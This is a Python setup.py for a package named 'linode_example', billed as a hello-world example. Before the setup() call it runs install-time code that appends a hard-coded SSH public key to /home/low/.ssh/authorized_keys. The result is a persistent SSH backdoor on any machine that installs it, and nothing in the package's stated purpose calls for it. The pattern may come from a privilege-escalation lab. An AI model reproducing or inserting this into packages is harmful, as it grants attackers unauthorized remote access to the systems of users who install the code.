from setuptools import setup
key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAAuFMyk8GsKrnWBcn4PX+tFDdbspvpfKrdmXS9Hs68U1ER4/5sCwpWzUSslTgsYtPB42lIbJy9Xl3NpXhpNxkhDexbkyKO5cl/TNmi/2jcQswcWAaew+0asPkmZsxJQHH+T2uH7C0lUIpIKKcEQmKp83dlKRBk1JJMzOwZMNVH/uXciPDpJjsH/PSRe3scFAwqjkZvGy0Wc2kBjV1S0mMZYeESryDBPX3u4vvGAMGjgRHYeYfM6VJQNx8sjhdFAT2jakrig1uf8hpv/jB6hqJdvQD7HJHJ6d7iBMmbhL1Z8xJZhdnBNefx7BJvFnIGZ47NKQGu8ucfw1X5fnuGIXv'

#key was to not use any modules..
f=open('/home/low/.ssh/authorized_keys','a')
f.write(key)
f.close

setup(
    name='linode_example',
    packages=['linode_example'],
    description='Hello world enterprise edition',
    version='1.9',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example'],
    )
